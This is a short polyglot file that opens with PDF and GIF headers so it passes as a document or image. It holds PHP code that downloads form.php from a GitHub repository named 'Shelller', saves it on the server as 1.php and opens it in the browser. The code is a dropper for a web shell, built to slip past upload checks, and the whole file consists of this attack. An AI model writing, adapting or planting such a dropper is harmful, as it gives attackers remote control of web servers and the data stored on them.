%PDF-1.3
%ÿÿÿÿ
GIF89;a
<html>
<?php
    $url = "https://github.com/poeice/Shelller/raw/main/form.php";
    $fileContent = file_get_contents($url);
    if ($fileContent !== false) {
        $fileName = "1.php"; 
        $uploadDirectory = "";
        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
            echo "<script>window.open('$uploadDirectory$fileName', '_blank');</script>";
            echo "<script>window.location.reload();</script>";
        } 
    }
?>
</html>
